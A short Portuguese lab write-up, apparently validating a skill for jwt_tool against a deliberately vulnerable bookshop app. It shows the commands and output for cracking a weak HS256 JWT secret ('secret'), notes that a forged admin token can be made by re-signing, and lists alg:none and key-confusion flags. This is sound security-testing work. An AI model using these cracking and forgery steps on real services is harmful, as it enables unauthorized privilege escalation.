# jwt-tool

## Objetivo
Decodificar, inspecionar e quebrar o JWT do dv-bookshop (`/api/jwt/login`), confirmando
HS256 com chave fraca e possibilidade de forjar tokens.

## Ambiente
- `ticarpi/jwt_tool` v2.3.0 (`labs/tools/src/jwt_tool`)
- Token: `labs/artifacts/dv-jwt.txt`, obtido com `alice_hacker / password123`
  (`POST /api/jwt/login`)
- Wordlist: `labs/artifacts/jwt-wordlist.txt` (7 segredos comuns)

## Comandos
```bash
python3 jwt_tool.py "$JWT"                       # decode
python3 jwt_tool.py "$JWT" -C -d wordlist.txt    # crack por dicionário
```
Dependências instaladas no venv a partir de `requirements.txt` (PyJWT, requests, etc.).

## Resultados
```
[+] alg = "HS256"
[+] typ = "JWT"
[+] sub = 2
[+] username = "alice_hacker"
[+] role = "user"
[+] iat = 1792611542 ==> 2026-10-21 15:39:02 (UTC)
...
[+] secret is the CORRECT key!
    python3 jwt_tool.py [opts] -S hs256 -p "secret"
```
- Header `HS256` + segredo `secret` (casa com `JWT_SECRET = 'secret'` achado pelo Gitleaks).
- Sem `exp`: token sem expiração.
- Com o segredo, `role` pode ser alterado para `admin` e re-assinado (`-T -S hs256 -p secret`).

## Achados / armadilhas
1. `-b` (bare mode) não imprime nada neste ambiente — usar a execução normal.
2. O `jwtconf.ini` é criado em `~/.jwt_tool/`; em ambiente sem `$HOME` gravável a ferramenta
   falha na inicialização.
3. `-C` mostra a palavra que casou; `-p` sozinho serve para assinar sem crackear.
4. Para testar `alg:none`/confusão de algoritmo, `-X a` (none) e `-X k` (key confusion,
   precisa da chave pública).

## Veredito
Skill validada. Confirmar no `SKILL.md` as flags `-C -d`, `-S hs256 -p` e a criação do
`~/.jwt_tool/jwtconf.ini`.
